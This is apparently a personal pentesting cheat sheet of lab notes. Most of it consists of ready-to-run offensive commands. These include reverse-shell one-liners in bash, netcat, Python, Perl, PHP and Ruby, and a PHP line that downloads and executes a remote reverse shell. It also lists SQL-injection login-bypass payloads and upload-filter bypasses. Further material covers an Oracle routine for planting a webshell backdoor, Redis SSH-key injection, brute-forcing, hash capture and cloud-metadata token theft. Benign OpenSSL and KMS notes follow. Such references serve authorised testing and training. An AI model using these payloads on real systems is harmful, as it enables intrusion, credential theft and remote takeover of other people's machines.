# Pentesting/Cyber Guide
```
                                               ___====-_  _-====___
                                         _--^^^#####//      \\#####^^^--_
                                      _-^##########// (    ) \\##########^-_
                                     -############//  |\^^/|  \\############-
                                   _/############//   (@::@)   \\############\_
                                  /#############((     \\//     ))#############\
                                 -###############\\    (oo)    //###############-
                                -#################\\  / VV \  //#################-
                               -###################\\/      \//###################-
                              _#/|##########/\######(   /\   )######/\##########|\#_
                              |/ |#/\#/\#/\/  \#/\##\  |  |  /##/\#/  \/\#/\#/\#| \|
                              `  |/  V  V  `   V  \#\| |  | |/#/  V   '  V  V  \|  '
                                 `   `  `      `   / | |  | | \   '      '  '   '
                                                  (  | |  | |  )
                                                 __\ | |  | | /__
                                                (vvv(VVV)(VVV)vvv)
```
### RPC Enumeration
```text
rpcclient [target IP]

rpcclient -U '' [target IP]

# rpcclient commands
enumdomusers
enumdomgroups
queryuser [rid]
querygroup [group rid]
```
### SMB Enumeration
```bash
smbclient -L //[target IP] -N
#
smbclient -U 'username' -P 'password' [target IP]/share

smbmap -H [target IP] -u '' -p '' -R

# downlaod files with smbmap
smbmap -H [target IP] -u 'user' -p 'password' --download [full_path_to_file]

crackmapexed smb [target IP] -u '' -p '' --shares
```
### Spawning TTY's

```bash
# using script
/usr/bin/script -qc /bin/bash /dev/null
```
```python=
# using python/python3
python -c "import pty;pty.spawn('/bin/bash')"
python3 -c "import pty;pty.spawn('/bin/bash')"
```
### Get auto-tab completetion after TTY
```bash=
# For Linux machines
CTRL+z
stty raw -echo
fg
Press 'Enter' multiple times

# check TERM variable on your machine
env | grep TERM

# on target machine 
export TERM=[your_TERM_variable]
# example
export TERM=xterm

# for Windows machines
# apt install rlwrap
rlwrap nc -nlvp '[port]'
```
### Extracting data from Excel files
```bash
binwalk -e '[excel file]'
```
### LDAP Enumeration
```bash
ldapsearch -x -h [target_ip]

ldapsearch -x -h [target_ip] -s base namingcontexts

ldapsearch -x -h [target_ip] -b 'DC=MEGABANK,DC=LOCAL' # example
```
### Webdav Enumeration
```bash=
davtest -url http://[target_ip]
```
### MDB Tools
```bash=
apt install mdb-tools

# show tables
mdb-tables [.mdb file]

for i in $(mdb-tables [.mdb file]); do mdb-export [.mdb file] $i; done
```
### Converting powershell command into base64 for execution
```bash=
echo -n [command] |iconv --to-code UTF-16LE |base64 -w 0

# how to run
powershell -EncodedCommand [base64_string]
powershell -enc [base_64]
```
### Read & Write Files in Oracle Database
```bash=
# read files
declare
  f utl_file.file_type;
  s varchar(200);
begin
  f := utl_file.fopen('/inetpub/wwwroot/', 'iisstart.htm', 'R');
  utl_file.get_line(f,s);
  utl_file.fclose(f);
  dbms_output.put_line(s);
end;

# to show output from script above:
set serveroutput ON


# write files
declare
  f utl_file.file_type;
  s varchar(1100) := 'string to write [preferably a webshell!!]';
begin
  f := utl_file.fopen('/inetpub/wwwroot', 'backdoor.aspx', 'W');
  utl_file.put_line(f,s);
  utl_file.fclose(f);
end;
```
----------------------------------------------------------------------------------
### ODAT
```
# for Oracle Database hacking
odat -h

  _        __           _           ___ 
 / \      |  \         / \         |_ _|
( o )       o )         o |         | | 
 \_/racle |__/atabase |_n_|ttacking |_|ool 
-------------------------------------------

By Quentin Hardy (quentin.hardy@protonmail.com or quentin.hardy@bt.com)

positional arguments:
  {all,tnscmd,tnspoison,sidguesser,passwordguesser,utlhttp,httpuritype,utltcp,ctxsys,externaltable,dbmsxslprocessor,dbmsadvisor,utlfile,dbmsscheduler,java,passwordstealer,oradbg,dbmslob,stealremotepwds,userlikepwd,smb,privesc,cve,search,unwrapper,clean}
                      
                      Choose a main command
    all               to run all modules in order to know what it is possible to do
    tnscmd            to communicate with the TNS listener
    tnspoison         to exploit TNS poisoning attack
    sidguesser        to know valid SIDs
    passwordguesser   to know valid credentials
    utlhttp           to send HTTP requests or to scan ports
    httpuritype       to send HTTP requests or to scan ports
    utltcp            to scan ports
    ctxsys            to read files
    externaltable     to read files or to execute system commands/scripts
    dbmsxslprocessor  to upload files
    dbmsadvisor       to upload files
    utlfile           to download/upload/delete files
    dbmsscheduler     to execute system commands without a standard output
    java              to execute system commands
    passwordstealer   to get hashed Oracle passwords
    oradbg            to execute a bin or script
    dbmslob           to download files
    stealremotepwds   to steal hashed passwords thanks an authentication sniffing (CVE-2012-3137)
    userlikepwd       to try each Oracle username stored in the DB like the corresponding pwd
    smb               to capture the SMB authentication
    privesc           to gain elevated access
    cve               to exploit a CVE
    search            to search in databases, tables and columns
    unwrapper         to unwrap PL/SQL source code (no for 9i version)
    clean             clean traces and logs

optional arguments:
  -h, --help          show this help message and exit
  --version           show program's version number and exit
```
### Connecting to Oracle Database with Sqlplus
```powershell
sqlplus user/password@target_ip/sid as sysdba

# if we can't access as admin
sqlplus user/password@target_ip/sid
```
### PowerUpSQL Cheat Sheet

[https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet](https://)
### Sqlcmd
```bash=
sqlcmd -? # for help
sqlcmd -Q 'xp_dirtree "//10.10.14.45/test"' # use responder to capture password
```
### Evil-winrm
```bash
evilwinrm -i 10.10.10.172 -u user -p 'password'
```
### Zone Transfers
```bash
dig axfr @10.10.10.13 cronos.htb
host -t axfr cronos.htb 10.10.10.13
```
### TcpDump
```bash
# filter for ICMP packets
tcpdump -i [interface] -n icmp
```
### Port Forwarding
```bash
# remote port forward example
#     - target had internal mysql port open
#     - port forward to our machine to gain access to internal port
ssh -R 3306:127.0.0.1:3306 root@10.10.14.45

# local port foward example
#     - target had internal mysql port open
#     - connecting to target and forwarding traffic from internal port 3306 to our port 3306 
ssh -L 3306:127.0.0.1:3306 user@10.10.10.10
```
### Connect to MySQL Database
```bash
mysql -h [target] --port [target_port] -u [user] -p [password]
# prompt for password
mysql -h [target] --port [target_port] -u [user] -p

# example for remote port forwarding
mysql -h 127.0.0.1 --port 3333 -u MYSQL_USER -pMYSQL_PASS
```
### PHP Download and execute
```php=
<?php
exec("curl http://10.10.14.45/php-reverse-shell.php | php")
?>
```
### Exporting PATH
```bash
# adding /tmp to PATH
# making /tmp the first directory Bash will check for executables
export PATH=/tmp:$PATH

# also adds /tmp to PATH
# but makes the /tmp directory the last directory Bash will check for executables
export PATH=$PATH:/tmp
```
### Bypassing Upload File Restrictions
```
PHP: phtml, .php, .php3, .php4, .php5, .inc

ASP: asp, .aspx

PERL: .pl, .pm, .cgi, .lib

JSP: .jsp, .jspx, .jsw, .jsv, .jspf

COLDFUSION: .cfm, .cfml, .cfc, .dbm
    
# example 
shell.aspx;.jpeg | shell.jsp.png
```
### Hydra Syntax
```bash
# FOR HTTPS
hydra -l admin -P /usr/share/wordlists/top1m-rockyou.txt 10.10.10.43 https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password." -t 64

# the difference is https-post-form for HTTPS and http-post-form for HTTP

# FOR HTTP
 hydra -l admin -P /usr/share/wordlists/top1m-rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid Password!"
```
### Local File Inclusion (LFI)
```
Example's:
http://[target]/file=/var/tmp/hack.php&cmd=ls

http://[target]/file=/var/tmp/hack.php?cmd=ls

http://[target]/file=../../../../../etc/passwd
```
### Go-to PentestMonkey Reverse Shells
```bash
bash -c "'bash -i >& /dev/tcp/[lhost]/[lport] 0>&1'"
# OR
bash -i >& /dev/tcp/[lhost]/[lport] 0>&1
```
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [ip] [port] >/tmp/f
```
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[lhost]",[lport]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
```perl
perl -e 'use Socket;$i="[lhost]";$p=[lport];socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
```php
php -r '$sock=fsockopen("[lhost]",[lport]);exec("/bin/sh -i <&3 >&3 2>&3");'
```
```ruby
ruby -rsocket -e'f=TCPSocket.open("[lhost]",[lport]).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```
### When Scanning a Webpage
- [ ] look at each pages source code for any lucrative information (passwords, usernames, service versions, programming language in use, etc)
- [ ] run directory brute force tools on root directory
    - [ ] if other directories are discovered, run directory brute force tools on these directories as well
- [ ] try checking multiple types of extensions (txt, php, aspx, etc) while directory brute forcing
- [ ] use wordlists that are specific to the server application (apache, IIS, Tomcat, etc)
### When confronted by a Login Page
- [ ] attempt sql injection
- [ ] if server application is known, try looking for default passwords for this service
- [ ] attempt to brute forcing admin account
    - [ ] if usernames are obtained, try brute forcing these accounts
- [ ] trying signing up to be an authenticated user, which comes with more privileges (some exploits require authentication)
### SQL Injection: Authentication Bypass
```
or 1=1
or 1=1--
or 1=1#
or 1=1/*

# SINGLE QUOTES
admin' --
admin' #
admin'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin'or 1=1 or ''='
admin' or 1=1
admin' or 1=1--
admin' or 1=1#
admin' or 1=1/*
admin') or ('1'='1
admin') or ('1'='1'--
admin') or ('1'='1'#
admin') or ('1'='1'/*
admin') or '1'='1
admin') or '1'='1'--
admin') or '1'='1'#
admin') or '1'='1'/*

# DOUBLE QUOTES
admin" --
admin" #
admin"/*
admin" or "1"="1
admin" or "1"="1"--
admin" or "1"="1"#
admin" or "1"="1"/*
admin"or 1=1 or ""="
admin" or 1=1
admin" or 1=1--
admin" or 1=1#
admin" or 1=1/*
admin") or ("1"="1
admin") or ("1"="1"--
admin") or ("1"="1"#
admin") or ("1"="1"/*
admin") or "1"="1
admin") or "1"="1"--
admin") or "1"="1"#
admin") or "1"="1"/*
```
###  Extracting Data From Images
```bash
binwalk -e [image_file]
exiftool [image_file]
```
### When No Ports Are Reported Open by Nmap
- [ ] try using nmap's `-sU` flag for scanning UDP ports!
    * UDP scan's can take a while so also use the `-vvv` flag to retrieve information quickly
### SNMP Enumeration
```text
# basic
snmpwalk -c public -v2c [target]
snmp-check [target]

# enumerate users
snmpwalk -c public -v1 [target] 1.3.6.1.4.1.77.1.2.25

# enumerate running processes
snmpwalk -c public -v1 [target] 1.3.6.1.2.1.25.4.2.1.2

# enumerate open TCP ports
snmpwalk -c public -v1 [target] 1.3.6.1.2.1.6.13.1.3

# enumerate installed software
snmpwalk -c public -v1 [target] 1.3.6.1.2.1.25.6.3.1.2
```
### Decrypting Group Policy Passwords: cpassword
```bash
gpp-decrypt [hash]
```
### Dumping Active Directory users from linux with Impacket GetADUsers
```bash
# Example
GetADUsers.py -dc-ip 10.10.10.100 -all active.htb/svc_tgs
```
### Kerberos Authentication: Enumerate Service Principal Names
```bash
GetUserSPN.py [domain]/[user]:[password] -dc-ip [domain-controller-ip] -request

# Example from Active on Hackthebox
GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request
```
### POP3 Commands
```text
USER <username>
PASS <password>
STAT
LIST
RETR
DELE
RSET
TOP
QUIT

# Login into POP3 with telnet
telnet <target> 110
```
### Privilege Escalation With Python
```python
python -c 'import os; os.system("nc <IP> <PORT>");'
```
### Redis SSH Key Upload
Generate a ssh public-private key pair on your pc: ssh-keygen -t rsa

Write the public key to a file : (echo -e "\n\n"; cat ./.ssh/id_rsa.pub; echo -e "\n\n") > foo.txt

Import the file into redis : cat foo.txt | redis-cli -h 10.85.0.52 -x set crackit

Save the public key to the authorized_keys file on redis server:
```
root@Urahara:~# redis-cli -h 10.85.0.52
# on the redis server
config set dir /home/test/.ssh/
config set dbfilename "authorized_keys"
save
```
Then, ssh onto the machine: ssh -i id_rsa root@10.10.10.60


### Password/Passphrase Cracking
```bash
hashcat -m <hash mode> <hashfile> <wordlist_file>
# example hashes
hashcat --example

# convert encrypted ssh key to hash crackable by john
ssh2john <private key> > output.hash
john <hash_file> --wordlist=<wordlist_file>

# list supported formats
john --list=formats
```
### When Password Has Been Obtained
* attempt to use the password for every possible account
* attempt to use the password to login to different services (ssh, http, etc)
* if the password has a year, and it does not work, try changing the year to the current year

### Pkexec
```bash
psexec.py <username>:'<password>'@<target>
# Example
psexec.py pentest:'P3nT3st!'@netmon.htb
```
### SQLMap
```a
sqlmap -r [file_with_HTTP_request_for_login_page] --level 5 --risk
```
### Generating RSA Keys With OpenSSL
```
#  generating private key
openssl genrsa -out <key_file_name>.pem 2048

# extracting public key from private key
openssl rsa -in <private_key_file> -out <public_key_file>.pem -outform PEM -pubout

# encrypting file with public key
openssl rsautl -encrypt -inkey <public_key> -pubin -in <file_to_encrypt> -out <output_file>

# decrypting file with private key
openssl rsautl -decrypt -inkey <private_key> -in <encrypted_file> -out <decrypted_file>
```
### Cracking Encrypted Microsoft Office Documents with John
```
python office2john.py [ms_doc_file] > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
### Capturing packets during pentest for proof of actions
```
# filter for packets coming from your ethernet address
# files will be named according to the date/time.
# here we also specified the maximum size of the pcap file 
dumpcap -f "ether host 00:0c:29:54:f1:d0" -w pentest -b filesize:10000
```
### Checking the SSL certificate of a website
```
openssl s_client -connect [IP]:443
```
### Generating an Openssl RSA key and generating Certificate Signing Request from key
```
openssl genrsa -aes256 -out test.key 2048
openssl req -key test.key -new -out domain.csr
```
### Signing a certificate signing request using a CA's public key and private key
```
openssl genrsa -aes256 -out binexis.key
openssl x509 -req -in binexis.csr -CA ca.cert -CAkey ca.key -CAcreateserial -out binexis.pem -days 1024 -sha256
```
### Packaging public key into pkcs format for importing to browser
```
openssl pkcs12 -export -out binexis.pfx -inkey binexis.key -in binexis.pem -certfile ca.cert
```
### Sending SMTP Emails with Swaks (Swiss Army Knife for SMTP)
```bash
swaks \
  --from [sender_email] \
  --to [recipient_email] \
  --header 'Subject message' \
  --body 'Body message' \
  --server [STMP Server IP]
```
### Edting `/etc/samba/smb.conf` for SMB share creation
```
[share_name]
  comment = Share description
  path = /home/user/Documents/smb/ # Path to the SMB share on your machine
  browseable = yes
  read only = no
  guest ok = yes
```
- Change permissions to share directory: `chmod 777 /home/user/Documents/smb/`
- Restart the SMB daemon: `sudo service smbd restart`
### Decrypt PowerShell `SecureString` Network Credentials
```powershell
$s = Import-CliXml -Path root.xml
$s.GetNetworkCredential().Password # Extracting Password XML field
```
### Create Secure String: PowerShell for PowerShell Remoting
```powershell
$Pass = ConvertTo-SecureString -AsPlainText -Force 'this is my secure p@ssword!@#'
$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\admin', $Pass)
Enter-PSSession -ComputerName 10.10.10.10 -Credential $Cred
```
### Socat
```
# Listen
socat TCP4-LISTEN:<listen-port> STDOUT

# Connect
soat TCP4:<remote-ip>:<remote-port> EXEC:/bin/bash

# Port Forward
socat TCP-LISTEN:<local-port>,reuseaddr,fork TCP:<forward-ip>:<forward-port>

# Host File
socat -u FILE:<file_name> TCP-LISTEN:<listen-port>,reuseaddr

# Get File
socat -u TCP:<listen-ip>:<listen-port> OPEN:<file-to-create>,create,trunc
```
### AWS Pentesting
```
IMDSv1
------
curl -s http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token -H 'Metadata-Flavor: Google' | jq

IMDSv2
------
# Generate token and set expiration to 6 hours
TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"` \
&& curl -H "X-aws-ec2-metadata-token: $TOKEN" -v http://169.254.169.254/latest/meta-data/
```
### GCP Pentesting
```bash
# retrieve instance token - the HTTP header ``Metadata-Flavor: Google`` must be specified!
curl -s http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token -H 'Metadata-Flavor: Google' | jq
```
### Ngrok Cloud Tunneling
```
# Go here to download Ngrok binary: https://dashboard.ngrok.com/get-started/setup

# provide API token to use
ngrok auth '<TOKEN>'

# ------ HTTP ------
# create HTTP tunnel
ngrok http <port-to-tunnel-to> # yes it's that simple!!!

# create a password protected HTTP tunnel
ngrok http -auth="username:password" 8080

# forward tunnel to a web server on a different machine
ngrok http 169.254.169.254:8080

# ------ TCP ------
# create TCP tunnel
ngrok tcp <port-to-tunnel-to>

# expose SSH server listening on local port 2222
ngrok tcp 2222
```
### Iptables 
```
# temporary routing
sudo sysctl net.ipv4.ip_forward=1

# permanent routing
echo "net.ipv4.ip_forward = 1" >> /etc/sysctl.conf

# creating a redirection rule with iptables
# rule = redirect traffic to inbound port to destination ip:port
iptables -I INPUT -p tcp -m tcp --dport 1234 -j ACCEPT
iptables -t nat -A PREROUTING -i <interface> -p tcp -dport <inbound-port> -j DNAT --to-destionation <dst-ip:dst-port>
iptables -t nat -A POSTROUTING -j MASQUERADE
iptables -I FORWARD -j ACCEPT
iptables -P FORWARD -j ACCEPT
```
### Netsh portproxy
```
# create a redirect rule
netsh interface portproxy add v4tov4 listenport=1234 connectport=8080 connectaddr=1.2.3.4

# show all portproxy rules
netsh interface portproxy show all
```
### AWS Key Management Service (KMS) Encrypt/Decrypt
```bash
# encrypt data
aws kms encrypt --key-id <KeyID> --plaintext "<plaintext>" | jq -r '.CiphertextBlob'

# decrypt data
aws kms decrypt --ciphertext-blob fileb://ciphertext.bin # the raw binary, not base64 encoded

# encrypt file
aws kms encrypt --key-id <KeyID> --plaintext fileb://<plain-text-file> --query CiphertextBlob --output text | base64 -d | base64 -w 76 > ciphertext-data.txt

# decrypt file
aws kms decrypt --ciphertext-blob fileb://ciphertext-data.txt --output text --query Plaintext | base64 -d > plaintext.txt
```
